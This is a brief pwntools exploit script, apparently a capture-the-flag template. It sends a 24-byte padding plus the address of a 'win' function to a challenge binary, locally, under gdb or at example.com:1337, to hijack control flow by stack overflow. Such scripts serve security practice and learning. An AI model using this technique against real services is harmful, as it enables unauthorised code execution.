#!/usr/bin/env python3
import click
from pwn import *

BINARY = './chal'
REMOTE = ['example.com', 1337]

GDBSCRIPT = """
    break main
    continue
"""
TERMINAL = ["alacritty", "-o", "window.startup_mode='Maximized'", "-e"]


@click.command()
@click.option('--remote', is_flag=True)
@click.option('--debug', is_flag=True)
@click.option('--interactive/--no-interactive', is_flag=True, default=True)
def main(remote, debug, interactive):
    elf = context.binary = ELF(BINARY)
    rop = ROP(elf)
    context.terminal = TERMINAL

    if remote:
        io = connect(REMOTE[0], REMOTE[1])
    elif debug:
        io = gdb.debug(BINARY, GDBSCRIPT)
    else:
        io = elf.process()

    # pop_rdi = next(rop.find_gadget(['pop rdi', 'ret']))
    payload = flat(
        # cyclic(100),
        b"A" * 24,
        elf.symbols["win"],
    )
    log.info(b"Payload: " + payload)

    # print(io.recvuntil(b"> ").decode(errors="replace"), end="", flush=True)
    io.sendline(payload)

    if interactive:
        io.interactive()
    else:
        print(io.recvall())


if __name__ == '__main__':
    main()
